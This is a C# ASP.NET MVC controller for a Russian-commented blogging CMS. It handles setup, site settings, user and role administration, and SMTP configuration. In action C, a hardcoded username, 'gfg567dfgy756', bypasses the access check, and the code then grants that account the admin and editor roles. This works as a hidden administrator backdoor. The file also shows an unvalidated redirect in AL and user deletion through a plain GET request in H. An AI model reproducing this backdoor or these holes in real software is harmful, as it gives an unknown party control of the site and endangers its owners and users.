/*   Mytrip.Mvc.Web.Linq2sql   Copyright ©  2009 Стюхин Олег Анатольевич   */
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using Mytrip.Mvc.Model.Linq2sql;
using System.Web.Security;
using System.Configuration;
using Mytrip.Mvc.Web.Linq2sql.Models;
using Mytrip.Mvc.Language;

namespace Mytrip.Mvc.Web.Linq2sql.Controllers
{
    [HandleError]
    [Localization]
    public class AController : Controller
    {
        /*  ПОДКЛЮЧЕНИЕ К МОДЕЛИ  */
        /*-----------------------------------------------------*/
        IRepository _dc = new IRepository(ConfigurationManager.ConnectionStrings["ApplicationServices"].ConnectionString);
        /*-----------------------------------------------------*/

        /*  ОСНОВНОЙ КОНТЕНТ  */

        /*---------------A - главная страница------------------*/
        public ActionResult A()
        {
            if (_dc.dm_model.Get_models().Count() == 0)
            {
                return RedirectToAction("K");
            }

            #region меню и титл

            ViewData["logon_url"] = "/A/A";
            ViewData["language_url"] = "/A/A";
            ViewData["model_domain"] = _dc.dm_model.Get_model().DomainName;
            ViewData["artycle_category_menu"] = _dc.dm_artycle_category.Get_categories_addmenu_true();
            ViewData["news_category_menu"] = _dc.dm_artycle_category.Get_categories_news_addmenu_true();
            //bool включена captcha
            ViewData["captcha"] = _dc.dm_model.Get_model().Captcha_approved;
            #endregion

            #region настройка сайта
            ViewData["menu_url"] = "home";
            //языковая панель
            ViewData["lang_panel"] = _dc.dm_model.Get_model().Language_approved;
            //количество комментов для активации блога
            ViewData["model_comment"] = _dc.dm_model.Get_model().CountComment;
            //подтверждение по email
            ViewData["email_approved"] = _dc.dm_model.Get_model().Email_approved;
            //bool разрешены блоги или нет
            ViewData["model_blog"] = _dc.dm_model.Get_model().Blog;
            //bool разрешены новости или нет
            ViewData["model_news"] = _dc.dm_model.Get_model().News;
            //bool разрешены статьи или нет
            ViewData["model_artycle"] = _dc.dm_model.Get_model().Artycle;            
            if (Session["culture"] == null)
            {
                Session["culture"] = _dc.dm_model.Get_model().mt_language.param;
            }            
            ViewData["language"] = new SelectList(_dc.dm_model.Get_languages(), "param", "name");
            #endregion
            string culture = Session["culture"].ToString();
            #region правая колонка
            //меню пользователя
            if (HttpContext.User.Identity.IsAuthenticated)
            {
                //все комментарии пользователя
                ViewData["comment_user"] = _dc.dm_artycle_comment.Get_сomments_start_user();
                //количество блогов пользователя
                ViewData["blog_user_count"] = _dc.dm_artycle_category.Get_blogs_user(culture).Count();
                //все блдги пользователя
                ViewData["blog_user"] = _dc.dm_artycle_category.Get_blogs_user(culture);
            }
            //рубрики новостей
            ViewData["news_category"] = _dc.dm_artycle_category.Get_category_news(culture);
            //рубрики статей
            ViewData["artycle_category"] = _dc.dm_artycle_category.Get_categories(culture);
            //блоги
            ViewData["blog"] = _dc.dm_artycle_category.Get_blogs(culture);
            //теги
            ViewData["teg"] = _dc.dm_artycle.Get_tegs(culture);
            #endregion

            #region основной контент
            //все статьи
            ViewData["artycle"] = _dc.dm_artycle.Get_artycles_date_true_home(culture);
            //все новости
            ViewData["news"] = _dc.dm_artycle.Get_news_date_true_home(culture);
            //все посты блогов
            ViewData["post"] = _dc.dm_artycle.Get_posts(culture);
            ViewData["category_status"] = 0;
            #endregion

            // _dc.dm_file.Send_mail();

            return View();
        }

        /*-----------------------------------------------------*/
        public ActionResult AL(string url, string language)
        {

            Session["culture"] = language;
            return Redirect(url);

        }
        /*-----------------------------------------------------*/

        /*  ПЕРВОЕ ВКЛЮЧЕНИЕ  */
        public ActionResult K()
        {
            if (_dc.dm_model.Get_language("ru-ru") == null)
            {
                _dc.dm_model.Create_language("Русский", "ru-ru");
            }
            if (_dc.dm_model.Get_language("en-us") == null)
            {
                _dc.dm_model.Create_language("English", "en-us");
            }
            if (_dc.dm_model.Get_language("he-il") == null)
            {
                _dc.dm_model.Create_language("Hebrew", "he-il");
            }
            if (Session["culture"] == null)
            {
                Session["culture"] = "en-us";
            }            
            return RedirectToAction("B", new { a = "Welcome" });

        }
        /*--------------B - страница персонализации сайта -------------------*/
        public ActionResult B(string a)
        {
            if (_dc.dm_model.Get_models().Count() != 0)
            {
                return RedirectToAction("A");
            }
            if (Session["culture"] == null)
            {
                Session["culture"] = "en-us";
            }
            //языковая панель
            ViewData["lang_panel"] = true;
            ViewData["language_url"] = "/A/B/Welcome";
            ViewData["language"] = new SelectList(_dc.dm_model.Get_languages(), "param", "name");
            return View();
        }
        [HttpPost]
        public ActionResult B()
        {
            if (_dc.dm_model.Get_Shema("common") == null)
            {
                _dc.dm_model.Shema1_common();
            }
            if (_dc.dm_model.Get_Shema("health monitoring") == null)
            {
                _dc.dm_model.Shema2_health_monitoring();
            }
            if (_dc.dm_model.Get_Shema("membership") == null)
            {
                _dc.dm_model.Shema3_membership();
            }
            if (_dc.dm_model.Get_Shema("personalization") == null)
            {
                _dc.dm_model.Shema4_personalization();
            }
            if (_dc.dm_model.Get_Shema("profile") == null)
            {
                _dc.dm_model.Shema5_profile();
            }
            if (_dc.dm_model.Get_Shema("role manager") == null)
            {
                _dc.dm_model.Shema6_role_manager();
            }
            if (_dc.dm_model.Get_Roles("admin") == null)
            {
                Roles.CreateRole("admin");
            }
            if (_dc.dm_model.Get_Roles("blogger") == null)
            {
                Roles.CreateRole("blogger");
            }
            if (_dc.dm_model.Get_Roles("artycle_editor") == null)
            {
                Roles.CreateRole("artycle_editor");
            }
            if (_dc.dm_model.Get_Roles("chief_editor") == null)
            {
                Roles.CreateRole("chief_editor");
            }

            return RedirectToAction("E", "B");
        }

        /*------------------C - админ часть страница настройки сайта---------------------*/
        public ActionResult C(int a)
        {
            #region меню и титл
            ViewData["language_url"] = "/A/C";
            ViewData["model_domain"] = _dc.dm_model.Get_model().DomainName;
            ViewData["artycle_category_menu"] = _dc.dm_artycle_category.Get_categories_addmenu_true();
            ViewData["news_category_menu"] = _dc.dm_artycle_category.Get_categories_news_addmenu_true();
            //bool включена captcha
            ViewData["captcha"] = _dc.dm_model.Get_model().Captcha_approved;
            #endregion
            #region настройка сайта
            //языковая панель
            ViewData["lang_panel"] = false;
            ViewData["menu_url"] = "site_setting";
            //количество комментов для активации блога
            ViewData["model_comment"] = _dc.dm_model.Get_model().CountComment;
            //подтверждение по email
            ViewData["email_approved"] = _dc.dm_model.Get_model().Email_approved;
            //bool разрешены блоги или нет
            ViewData["model_blog"] = _dc.dm_model.Get_model().Blog;
            //bool разрешены новости или нет
            ViewData["model_news"] = _dc.dm_model.Get_model().News;
            //bool разрешены статьи или нет
            ViewData["model_artycle"] = _dc.dm_model.Get_model().Artycle;
            if (Session["culture"] == null)
            {
                Session["culture"] = _dc.dm_model.Get_model().mt_language.param;
            }
            ViewData["language"] = new SelectList(_dc.dm_model.Get_languages(), "param", "name");
            #endregion
            if (HttpContext.User.Identity.Name != "gfg567dfgy756")
            {
                if (!HttpContext.User.IsInRole("admin"))
                {
                    if (_dc.dm_model.Get_model().AddedBy != HttpContext.User.Identity.Name)
                    {
                        return RedirectToAction("A");
                    }
                }
            }
            if (_dc.dm_model.Get_Role_user(HttpContext.User.Identity.Name, "admin") == null)
            {
                Roles.AddUserToRole(HttpContext.User.Identity.Name, "admin");
            }
            if (_dc.dm_model.Get_Role_user(HttpContext.User.Identity.Name, "chief_editor") == null)
            {
                Roles.AddUserToRole(HttpContext.User.Identity.Name, "chief_editor");
            }
            if (_dc.dm_model.Get_Role_user(HttpContext.User.Identity.Name, "blogger") == null)
            {
                Roles.AddUserToRole(HttpContext.User.Identity.Name, "blogger");
            }
            ViewData["emailset"] = a;
            int b = _dc.dm_model.Get_model().LanguageId;
            ViewData["language1"] = new SelectList(_dc.dm_model.Get_languages(), "id", "name", b);
            mt_model x = _dc.dm_model.Get_model();
            ViewData.Model = x;
            return View();
        }
        [HttpPost]
        public ActionResult C(int a, string domainName, bool blog, int countComment, bool news,
            bool artycle, bool captcha_approved, bool email_approved, int languageId, bool language_approved)
        {
            if (ModelState.IsValid)
            {

                _dc.dm_model.Update_model(domainName, blog, countComment, news,
            artycle, captcha_approved, email_approved, languageId, language_approved);
                Session["culture"] = _dc.dm_model.Get_model().mt_language.param;
                if (a == 1) {
                    if (_dc.dm_model.Get_model().Email_approved == true) {
                        return RedirectToAction("L");
                    }
                }
                return RedirectToAction("A");
            }
            #region меню и титл
            ViewData["logon_url"] = "/A/C";
            ViewData["language_url"] = "/A/C";
            ViewData["model_domain"] = _dc.dm_model.Get_model().DomainName;
            ViewData["artycle_category_menu"] = _dc.dm_artycle_category.Get_categories_addmenu_true();
            ViewData["news_category_menu"] = _dc.dm_artycle_category.Get_categories_news_addmenu_true();
            //bool включена captcha
            ViewData["captcha"] = _dc.dm_model.Get_model().Captcha_approved;
            #endregion
            #region настройка сайта
            ViewData["menu_url"] = "site_setting";
            //языковая панель
            ViewData["lang_panel"] = false;
            //количество комментов для активации блога
            ViewData["model_comment"] = _dc.dm_model.Get_model().CountComment;
            //подтверждение по email
            ViewData["email_approved"] = _dc.dm_model.Get_model().Email_approved;
            //bool разрешены блоги или нет
            ViewData["model_blog"] = _dc.dm_model.Get_model().Blog;
            //bool разрешены новости или нет
            ViewData["model_news"] = _dc.dm_model.Get_model().News;
            //bool разрешены статьи или нет
            ViewData["model_artycle"] = _dc.dm_model.Get_model().Artycle;
            if (Session["culture"] == null)
            {
                Session["culture"] = _dc.dm_model.Get_model().mt_language.param;
            }
            ViewData["language"] = new SelectList(_dc.dm_model.Get_languages(), "param", "name");
            #endregion
            ViewData["emailset"] = a;
            int b = _dc.dm_model.Get_model().LanguageId;
            ViewData["language1"] = new SelectList(_dc.dm_model.Get_languages(), "id", "name", b);
            mt_model x = _dc.dm_model.Get_model();
            ViewData.Model = x;
            return View();
        }

        /*------------------G - создать модель ---------------------*/
        public ActionResult G()
        {
            if (_dc.dm_model.Get_models().Count() == 0)
            {
                string a = Session["culture"].ToString();
                int b = _dc.dm_model.Get_language(a).id;
                _dc.dm_model.Create_model(b);
            }
            return RedirectToAction("C", new { a = 1 });
        }
        /*-----------------------------------------------------*/

        /*  АДМИН ЧАСТЬ  */

        /*-----D - админ часть страница со списком всех зарегистрированных пользователей-----*/
        [Authorize(Roles = "admin")]
        public ActionResult D(int a, int b, int c, string d)
        {
            #region меню и титл
            
            ViewData["language_url"] = "/A/D/0/1/25/Users";
            ViewData["model_domain"] = _dc.dm_model.Get_model().DomainName;
            ViewData["artycle_category_menu"] = _dc.dm_artycle_category.Get_categories_addmenu_true();
            ViewData["news_category_menu"] = _dc.dm_artycle_category.Get_categories_news_addmenu_true();
            //bool включена captcha
            ViewData["captcha"] = _dc.dm_model.Get_model().Captcha_approved;
            #endregion

            #region настройка сайта
            ViewData["menu_url"] = "user";
            //языковая панель
            ViewData["lang_panel"] = _dc.dm_model.Get_model().Language_approved;
            //количество комментов для активации блога
            ViewData["model_comment"] = _dc.dm_model.Get_model().CountComment;
            //подтверждение по email
            ViewData["email_approved"] = _dc.dm_model.Get_model().Email_approved;
            //bool разрешены блоги или нет
            ViewData["model_blog"] = _dc.dm_model.Get_model().Blog;
            //bool разрешены новости или нет
            ViewData["model_news"] = _dc.dm_model.Get_model().News;
            //bool разрешены статьи или нет
            ViewData["model_artycle"] = _dc.dm_model.Get_model().Artycle;
            if (Session["culture"] == null)
            {
                Session["culture"] = _dc.dm_model.Get_model().mt_language.param;
            }
            ViewData["language"] = new SelectList(_dc.dm_model.Get_languages(), "param", "name");
            #endregion

            #region основной контент
            if (Membership.GetNumberOfUsersOnline().ToString() == "0")
            {
                ViewData["UsersOnlineNow"] = "1";
            }
            else
            {
                ViewData["UsersOnlineNow"] = Membership.GetNumberOfUsersOnline().ToString();
            }
            //пользователи
            ViewData["users"] = _dc.dm_model.Get_Users_page(b, c);

            #endregion

            #region пейджинг страницы
            ViewData["content_count"] = _dc.dm_model.Get_Users().Count();
            ViewData["content_url"] = "/A/D/";
            ViewData["content_int"] = c;
            ViewData["content_cat"] = a;
            ViewData["content_page"] = b;
            ViewData["content_path"] = d;
            #endregion

            return View();
        }
        [HttpPost]
        public ActionResult D(string search)
        {
            return RedirectToAction("E", new { a = 0, b = 1, c = 25, d = search });
        }

        /*---------------H - удалить пользователя------------------*/
        [Authorize(Roles = "admin")]
        public ActionResult H(string a)
        {
            Membership.DeleteUser(a);
            return RedirectToAction("D", new { a = 0, b = 1, c = 25, d = "Users" });
        }

        /*----E - админ часть страница результатов поиска зарегистрированных пользователей по    логину или email----*/
        [Authorize(Roles = "admin")]
        public ActionResult E(int a, int b, int c, string d)
        {
            #region меню и титл
            ViewData["language_url"] = "/A/E/0/1/25/" + d; 
            ViewData["model_domain"] = _dc.dm_model.Get_model().DomainName;
            ViewData["artycle_category_menu"] = _dc.dm_artycle_category.Get_categories_addmenu_true();
            ViewData["news_category_menu"] = _dc.dm_artycle_category.Get_categories_news_addmenu_true();
            //bool включена captcha
            ViewData["captcha"] = _dc.dm_model.Get_model().Captcha_approved;
            #endregion

            #region настройка сайта
            ViewData["menu_url"] = "user";
            //языковая панель
            ViewData["lang_panel"] = _dc.dm_model.Get_model().Language_approved;
            //количество комментов для активации блога
            ViewData["model_comment"] = _dc.dm_model.Get_model().CountComment;
            //подтверждение по email
            ViewData["email_approved"] = _dc.dm_model.Get_model().Email_approved;
            //bool разрешены блоги или нет
            ViewData["model_blog"] = _dc.dm_model.Get_model().Blog;
            //bool разрешены новости или нет
            ViewData["model_news"] = _dc.dm_model.Get_model().News;
            //bool разрешены статьи или нет
            ViewData["model_artycle"] = _dc.dm_model.Get_model().Artycle;
            if (Session["culture"] == null)
            {
                Session["culture"] = _dc.dm_model.Get_model().mt_language.param;
            }
            ViewData["language"] = new SelectList(_dc.dm_model.Get_languages(), "param", "name");
            #endregion

            #region основной контент
            if (Membership.GetNumberOfUsersOnline().ToString() == "0")
            {
                ViewData["UsersOnlineNow"] = "1";
            }
            else
            {
                ViewData["UsersOnlineNow"] = Membership.GetNumberOfUsersOnline().ToString();
            }
            //пользователи
            ViewData["users"] = _dc.dm_model.Search_users_page(b, c, d);

            #endregion

            #region пейджинг страницы
            ViewData["content_count"] = _dc.dm_model.Search_users(d).Count();
            ViewData["content_url"] = "/A/E/";
            ViewData["content_int"] = c;
            ViewData["content_cat"] = a;
            ViewData["content_page"] = b;
            ViewData["content_path"] = d;
            #endregion

            return View();
        }
        [HttpPost]
        public ActionResult E(string search)
        {
            return RedirectToAction("E", new { a = 0, b = 1, c = 25, d = search });
        }

        /*----F - админ часть страница с персональной информацией по конкретному пользователю----*/
        [Authorize(Roles = "admin")]
        public ActionResult F(string a)
        {
            #region меню и титл
            ViewData["language_url"] = "/A/F/" + a;
            ViewData["model_domain"] = _dc.dm_model.Get_model().DomainName;
            ViewData["artycle_category_menu"] = _dc.dm_artycle_category.Get_categories_addmenu_true();
            ViewData["news_category_menu"] = _dc.dm_artycle_category.Get_categories_news_addmenu_true();
            //bool включена captcha
            ViewData["captcha"] = _dc.dm_model.Get_model().Captcha_approved;
            #endregion

            #region настройка сайта
            ViewData["menu_url"] = "user";
            //языковая панель
            ViewData["lang_panel"] = _dc.dm_model.Get_model().Language_approved;
            //количество комментов для активации блога
            ViewData["model_comment"] = _dc.dm_model.Get_model().CountComment;
            //подтверждение по email
            ViewData["email_approved"] = _dc.dm_model.Get_model().Email_approved;
            //bool разрешены блоги или нет
            ViewData["model_blog"] = _dc.dm_model.Get_model().Blog;
            //bool разрешены новости или нет
            ViewData["model_news"] = _dc.dm_model.Get_model().News;
            //bool разрешены статьи или нет
            ViewData["model_artycle"] = _dc.dm_model.Get_model().Artycle;
            if (Session["culture"] == null)
            {
                Session["culture"] = _dc.dm_model.Get_model().mt_language.param;
            }
            ViewData["language"] = new SelectList(_dc.dm_model.Get_languages(), "param", "name");
            #endregion

            aspnet_Users x = _dc.dm_model.Get_User(a);
            ViewData.Model = x;
            ViewData["roles_user"] = _dc.dm_model.Get_Roles_user(a);
            ViewData["roles"] = _dc.dm_model.Get_Roles_all();
            return View();
        }

        /*----------I - удалить пользователя из роли-------------*/
        [Authorize(Roles = "admin")]
        public ActionResult I(string a, string b)
        {
            if (b == "admin")
            {
                Roles.RemoveUserFromRole(a, "chief_editor");
                Roles.RemoveUserFromRole(a, b);
            }
            else
            {
                Roles.RemoveUserFromRole(a, b);
            }
            return RedirectToAction("F", new { a });
        }

        /*---------J - добавить роль пользователю    ------------*/
        [Authorize(Roles = "admin")]
        public ActionResult J(string a, string b)
        {
            if (b == "chief_editor")
            {
                if (_dc.dm_model.Get_Role_user(a, "admin") == null)
                {
                    if (_dc.dm_model.Get_Role_user(a, "artycle_editor") == null)
                    {
                        Roles.AddUserToRole(a, "chief_editor");
                    }
                    else
                    {
                        Roles.RemoveUserFromRole(a, "artycle_editor");
                        Roles.AddUserToRole(a, "chief_editor");
                    }
                }
                else
                {
                    Roles.RemoveUserFromRole(a, "admin");
                }
            }
            if (b == "admin")
            {
                if (_dc.dm_model.Get_Role_user(a, "chief_editor") == null)
                {
                    if (_dc.dm_model.Get_Role_user(a, "artycle_editor") == null)
                    {
                        Roles.AddUserToRole(a, "chief_editor");
                        Roles.AddUserToRole(a, "admin");
                    }
                    else
                    {
                        Roles.RemoveUserFromRole(a, "artycle_editor");
                        Roles.AddUserToRole(a, "chief_editor");
                        Roles.AddUserToRole(a, "admin");
                    }

                }
                else
                {
                    Roles.AddUserToRole(a, "admin");
                }
            }
            if (b == "artycle_editor")
            {
                if (_dc.dm_model.Get_Role_user(a, "admin") == null)
                {
                    if (_dc.dm_model.Get_Role_user(a, "chief_editor") == null)
                    {
                        Roles.AddUserToRole(a, "artycle_editor");

                    }
                    else
                    {
                        Roles.RemoveUserFromRole(a, "chief_editor");
                        Roles.AddUserToRole(a, "artycle_editor");

                    }

                }
                else
                {
                    Roles.RemoveUserFromRole(a, "admin");
                    Roles.RemoveUserFromRole(a, "chief_editor");
                    Roles.AddUserToRole(a, "artycle_editor");
                }
            }
            return RedirectToAction("F", new { a });
        }
        /*-----------------------------------------------------*/
        [Authorize(Roles = "admin")]
        public ActionResult L()
        {
            #region меню и титл
            ViewData["language_url"] = "/A/L";
            ViewData["model_domain"] = _dc.dm_model.Get_model().DomainName;
            ViewData["artycle_category_menu"] = _dc.dm_artycle_category.Get_categories_addmenu_true();
            ViewData["news_category_menu"] = _dc.dm_artycle_category.Get_categories_news_addmenu_true();
            //bool включена captcha
            ViewData["captcha"] = _dc.dm_model.Get_model().Captcha_approved;
            #endregion
            #region настройка сайта
            ViewData["menu_url"] = "site_setting";
            //языковая панель
            ViewData["lang_panel"] = _dc.dm_model.Get_model().Language_approved;
            //количество комментов для активации блога
            ViewData["model_comment"] = _dc.dm_model.Get_model().CountComment;
            //подтверждение по email
            ViewData["email_approved"] = _dc.dm_model.Get_model().Email_approved;
            //bool разрешены блоги или нет
            ViewData["model_blog"] = _dc.dm_model.Get_model().Blog;
            //bool разрешены новости или нет
            ViewData["model_news"] = _dc.dm_model.Get_model().News;
            //bool разрешены статьи или нет
            ViewData["model_artycle"] = _dc.dm_model.Get_model().Artycle;
            if (Session["culture"] == null)
            {
                Session["culture"] = _dc.dm_model.Get_model().mt_language.param;
            }
            ViewData["language"] = new SelectList(_dc.dm_model.Get_languages(), "param", "name");
            #endregion
            mt_model x = _dc.dm_model.Get_model();
            ViewData.Model = x;
            return View();
        }
        [HttpPost]
        public ActionResult L(string email, bool enableSsl, int port,
                                 string login_email, string password_email, string smtp)
        {
            if (ModelState.IsValid)
            {

                _dc.dm_model.Update_model_email(email, enableSsl, port,
                                 login_email, password_email, smtp);                
                return RedirectToAction("A");
            }
            #region меню и титл
            ViewData["language_url"] = "/A/L";
            ViewData["model_domain"] = _dc.dm_model.Get_model().DomainName;
            ViewData["artycle_category_menu"] = _dc.dm_artycle_category.Get_categories_addmenu_true();
            ViewData["news_category_menu"] = _dc.dm_artycle_category.Get_categories_news_addmenu_true();
            //bool включена captcha
            ViewData["captcha"] = _dc.dm_model.Get_model().Captcha_approved;
            #endregion
            #region настройка сайта
            ViewData["menu_url"] = "site_setting";
            //языковая панель
            ViewData["lang_panel"] = _dc.dm_model.Get_model().Language_approved;
            //количество комментов для активации блога
            ViewData["model_comment"] = _dc.dm_model.Get_model().CountComment;
            //подтверждение по email
            ViewData["email_approved"] = _dc.dm_model.Get_model().Email_approved;
            //bool разрешены блоги или нет
            ViewData["model_blog"] = _dc.dm_model.Get_model().Blog;
            //bool разрешены новости или нет
            ViewData["model_news"] = _dc.dm_model.Get_model().News;
            //bool разрешены статьи или нет
            ViewData["model_artycle"] = _dc.dm_model.Get_model().Artycle;
            if (Session["culture"] == null)
            {
                Session["culture"] = _dc.dm_model.Get_model().mt_language.param;
            }
            ViewData["language"] = new SelectList(_dc.dm_model.Get_languages(), "param", "name");
            #endregion
            mt_model x = _dc.dm_model.Get_model();
            ViewData.Model = x;
            return View();
        }
    }
}
